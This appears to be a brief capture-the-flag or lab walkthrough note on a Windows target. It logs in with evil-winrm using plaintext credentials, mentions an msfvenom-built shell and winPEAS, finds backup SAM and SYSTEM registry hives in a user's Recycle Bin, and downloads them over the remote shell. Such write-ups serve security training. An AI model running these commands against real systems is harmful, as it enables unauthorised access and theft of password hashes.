Gained initial foothold using `evil-winrm`
```bash
evil-winrm -i 10.10.54.53 -u 'Jareth' -p 'sarah'
```

Also gained another shell by generating `shell.exe` using msfvenom

Running winPEAS.bat on the system gives us user `Jareth`'s SID
`S-1-5-21-1987495829-1628902820-919763334-1001`

SID can also be used to access the target user's Recycle Bin 

`C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001`

The folder contained the following files:
![[Pasted image 20240814112507.png]]

Copied `sam.bak` and `system.bak` to `C:\Users\Jareth\Documents` and downloaded the files via the `evil-winrm` remote shell 

```
download sam.bak
download system.bak
```
